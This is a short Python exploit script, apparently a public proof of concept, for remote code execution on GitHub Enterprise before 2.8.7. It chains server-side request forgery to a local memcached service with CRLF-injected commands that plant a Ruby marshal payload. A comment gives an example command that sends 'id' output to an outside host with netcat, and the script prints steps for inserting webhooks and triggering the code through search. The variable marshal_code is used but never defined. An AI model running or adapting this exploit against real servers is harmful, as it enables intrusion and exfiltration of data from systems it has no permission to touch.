from urllib import quote
 
&#039;&#039;&#039; set up the marshal payload from IRB
code = "`id | nc orange.tw 12345`"
&#039;&#039;&#039;
 
payload = [
    &#039;&#039;,
    &#039;set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d&#039; % len(marshal_code),
    marshal_code,
    &#039;&#039;,
    &#039;&#039;
]
 
payload = map(quote, payload)
url = &#039;http://0:8000/composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/&#039;
 
print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by orange@chroot.org"
print &#039;-&#039;*10 + &#039;\n&#039;
print url + &#039;%0D%0A&#039;.join(payload)
print &#039;&#039;&#039;
Inserting WebHooks from:
https://ghe-server/:user/:repo/settings/hooks
 
Triggering RCE from:
https://ghe-server/search?q=ggggg&type=Repositories
&#039;&#039;&#039;

